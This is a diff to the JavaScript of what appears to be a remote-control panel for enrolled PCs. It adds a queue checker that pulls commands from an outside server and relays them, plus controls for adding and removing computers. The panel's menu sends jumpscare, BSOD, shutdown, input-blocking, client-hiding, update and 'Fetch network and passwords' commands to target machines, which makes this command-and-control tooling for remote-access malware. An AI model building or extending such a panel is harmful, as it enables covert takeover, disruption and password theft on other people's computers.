@@ -3,6 +3,7 @@ const settingsOverlay = document.querySelector('.settings-overlay');
 let computerItems = document.querySelectorAll('.computer-list li');
 const toggleSettings = document.querySelector('.toggle-settings');
 const computerList = document.querySelector('.computer-list');
+const addComputers = document.querySelector('.add-computer');
 const displayArea = document.querySelector('.display-area');
 const displayText = document.querySelector('.display-text');
 const displayBox = document.querySelector('.display-box');
@@ -146,7 +147,7 @@ async function refreshPCList() {
     if (computers == '') { 
         terminal.warn('No PCs found.');
         autoRefreshChecker()
-        return
+        return;
     }
 
     computerList.innerHTML = computers
@@ -157,6 +158,27 @@ async function refreshPCList() {
     terminal.log('Loaded computers.')  
 
     autoRefreshChecker()
+}
+
+async function queueChecker() {
+    const res = await fetch('https://cslckrwbcl.lrdevstudio.com/messages')
+    const text = await res.text()
+
+    if (!text || text.trim() === '[]') {
+        terminal.log('Queue is empty')
+        return
+    }
+
+    const queue = JSON.parse(text.replace(/\n/g, ''))
+    terminal.log(`Current queue: ${JSON.stringify(queue)}`)
+
+    if (Array.isArray(queue)) {
+        for (const msg of queue) {
+            await POST(msg)
+        }
+    } else {
+        await POST(queue)
+    }
 }
 
 auth();
@@ -179,7 +201,7 @@ if (localStorage.getItem('skipBoot') == 'false' || localStorage.getItem('skipBoo
 }
 
 if (localStorage.getItem('flicker') == 'true') {
-    noPcs.style.animation = "flicker 1.5s infinite alternate"
+    noPcs.style.animation = "flicker 1.5s infinite"
 }
 
 (async () => {
@@ -206,12 +228,13 @@ if (localStorage.getItem('flicker') == 'true') {
             <button class="options-menu-button always-enabled" data-action="delete-videos">Delete all stored videos</button>
             <button class="options-menu-button disabled" data-action="jumpscare">Jumpscare</button>
             <button class="options-menu-button disabled" data-action="neautralize">Neautralize</button>
+            <button class="options-menu-button always-enabled" data-action="check-queue">Check Queue</button>
             <button class="options-menu-button disabled" data-action="all-networks">Fetch network and passwords</button>
             <button class="options-menu-button disabled" data-action="shutdown">Shutdown PC</button>
             <button class="options-menu-button disabled" data-action="bsod">BSOD</button>
-            <button class="options-menu-button disabled" data-action="flash">Flash PC</button>
             <button class="options-menu-button disabled" data-action="block">Block Inputs</button>
             <button class="options-menu-button disabled" data-action="update">Release Update</button>
+            <button class="options-menu-button disabled" data-action="remove-computer">Remove Computer</button>
         `
         menu.appendChild(optionsMenu)
         optionsMenuButton = document.querySelectorAll('.options-menu-button')
@@ -229,6 +252,14 @@ if (localStorage.getItem('flicker') == 'true') {
         optionsMenu.classList.remove('show')
         options.classList.remove('active')
     }
+
+    addComputers.addEventListener('click', () => {
+        openPopup('Name of New Computer', 'Add Computers', 'text', async (value) => {
+            await POST({'computer_name': value})
+            terminal.log(`Added computer: ${value}`)
+            await refreshPCList()
+        })
+    })
 
     options.addEventListener('click', e => {
         e.stopPropagation()
@@ -440,6 +471,8 @@ if (localStorage.getItem('flicker') == 'true') {
 
                 terminal.success(`Jumpscared ${computerName}`)
             })
+        } else if (action === 'check-queue') {
+            await queueChecker()
         } else if (action === 'neautralize') {
             await POST({
                 action: `hidewbcl-${computerName}`
@@ -506,11 +539,6 @@ if (localStorage.getItem('flicker') == 'true') {
                 action: `bsod-${computerName}`
             }) 
             terminal.success(`BSOD to ${computerName} sent.`)
-        } else if (action === 'flash')  {
-            await POST({
-                action: `flash-${computerName}`
-            }) 
-            terminal.success(`Flashing signal to ${computerName} sent.`)
         } else if (action === 'block') { 
             await POST({
                 action: `blockinput-${computerName}`
@@ -521,6 +549,16 @@ if (localStorage.getItem('flicker') == 'true') {
                 action: `updatewbcl-${computerName}`
             }) 
             terminal.success(`Update released for ${computerName}.`)
+        } else if (action === 'remove-computer') {
+            openPopup('Please type in "REMOVE" to confirm!', 'Remove Computer', 'text', async (value) => {
+                if (value !== 'REMOVE') {
+                    terminal.warn('Removal cancelled.')
+                    return
+                }
+                await POST({'action': `remove-computer-${computerName}`})
+                terminal.warn(`Removed computer: ${computerName}`)
+                await refreshPCList()
+            })
         }
     })
 
